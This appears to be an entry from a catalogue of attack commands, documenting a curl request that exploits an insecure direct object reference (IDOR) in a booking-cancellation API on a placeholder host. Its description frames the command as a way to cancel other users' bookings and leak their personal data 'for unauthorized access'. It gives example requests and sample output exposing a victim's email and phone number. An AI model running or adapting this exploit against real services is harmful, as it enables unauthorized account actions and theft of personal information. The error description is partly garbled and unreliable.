---
data: >-
  curl -X POST https://eternal.example.com/api/v1/bookings/cancel -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d
  '{"booking_id": "TARGET_BOOKING_ID"}'
tags:
  - web
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.863Z'
id: d0cb997d-005a-41e1-abd2-6d9d981bc5fe
verified: false
validated: true
submitted: true
---
# curl-cancel-table-booking

## Command

```bash
curl -X POST https://eternal.example.com/api/v1/bookings/cancel -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"booking_id": "TARGET_BOOKING_ID"}'
```

## Description

This curl command sends a POST request to the Eternal application's booking cancellation endpoint, exploiting IDOR by using a tampered booking_id to cancel another user's booking and potentially leak PII. Use it after modifying the ID for unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://eternal.example.com/api/v1/bookings/cancel` | Target API endpoint URL | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with JWT or session token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON body type | Yes |
| `-d '{"booking_id": "TARGET_BOOKING_ID"}'` | JSON payload with the booking ID to tamper | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://eternal.example.com/api/v1/bookings/cancel -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"booking_id": "456"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://eternal.example.com/api/v1/bookings/cancel -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"booking_id": "456"}'
```

## Expected Output

Successful response: {"success": true, "message": "Booking cancelled", "user": {"email": "victim@example.com", "mobile": "+1-555-1234", "uuid": "def-456-ghi"}}. Errors may include 403 if authorized, or 200 with leak if vulnerable.

## Related

- [[Related Procedure: Submit-Modified-Cancellation-Request]]
